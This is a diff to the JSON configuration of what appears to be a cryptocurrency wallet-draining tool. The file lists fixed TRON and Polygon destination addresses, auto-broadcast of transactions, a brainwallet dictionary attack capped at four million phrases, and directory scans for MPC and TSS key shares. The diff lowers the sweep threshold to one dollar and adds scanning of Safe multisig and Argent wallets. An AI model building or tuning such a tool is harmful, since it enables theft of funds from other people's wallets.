@@ -15,7 +15,7 @@
             "TRON": "TM9U9kikD1KqJRc7Mp8e8mhEsTaGm11L2z",
             "POLYGON": "0x2C1679c260601111e496720869ec43F668841bca"
         },
-        "min_balance_usd": 10.0,
+        "min_balance_usd": 1.0,
         "auto_broadcast": true,
         "priority_fee_multiplier": 1.5,
         "check_interval": 30
@@ -41,6 +41,8 @@
     "scan": {
         "check_erc20_tokens": true,
         "check_trc20_tokens": true,
+        "check_safe": true,
+        "check_argent": false,
         "mempool_poll_interval": 30,
         "balance_cache_ttl": 30,
         "token_contracts": {
@@ -75,6 +77,18 @@
     "brainwallet": {
         "dictionary_path": "",
         "max_phrases": 4000000
+    },
+    "multisig": {
+        "safe_service_url": "https://safe-transaction-mainnet.safe.global",
+        "max_salt_nonce": 5
+    },
+    "social": {
+        "argent_enabled": true,
+        "check_on_scan": false
+    },
+    "tss": {
+        "scan_directories": [],
+        "max_depth": 5
     },
     "mpc_recovery": {
         "scan_directories": [],
